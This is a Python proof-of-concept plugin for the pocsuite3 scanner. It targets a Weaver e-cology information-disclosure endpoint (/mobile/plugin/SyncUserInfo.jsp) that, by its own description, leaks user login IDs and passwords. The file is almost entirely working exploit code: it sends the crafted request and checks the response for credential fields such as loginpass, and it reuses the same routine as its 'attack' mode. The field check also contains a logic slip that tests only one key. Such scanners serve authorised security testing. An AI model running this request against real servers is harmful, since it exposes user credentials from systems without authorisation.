#!/usr/bin/env python
# coding: utf-8
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''泛微e-cology_SyncUserInfo_info-disclosure'''
    desc = '''泄露应用用户的登录信息和密码等信息'''
    solution = ''''''
    severity = '''medium'''
    vulType = '''info-disclosure'''
    taskType = '''app-vul'''
    references = ['''''']
    appName = '''e-cology'''
    appVersion = '''无'''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        result = {}
        self.url, ip, port = parse_ip_port(self.target, 80)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': self.url
        }
        payload = "/mobile/plugin/SyncUserInfo.jsp?userIdentifiers=3"
        verify_url = make_verify_url(self.url, payload, mod=0)
        resp = requests.get(verify_url, headers=headers, verify=False, timeout=20)
        try:
            resp_j = resp.json()['userList'][0]
            if 'application/json' in resp.headers['Content-Type'] and 'ecology_JSessionId' in resp.headers[
                'Set-Cookie'] and (
                    'email' and 'id' and 'loginid' and 'loginpass' and 'mobile') in resp_j.keys() and resp.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = resp.url
                result['VerifyInfo']['port'] = port
        except:
            pass
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        # parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
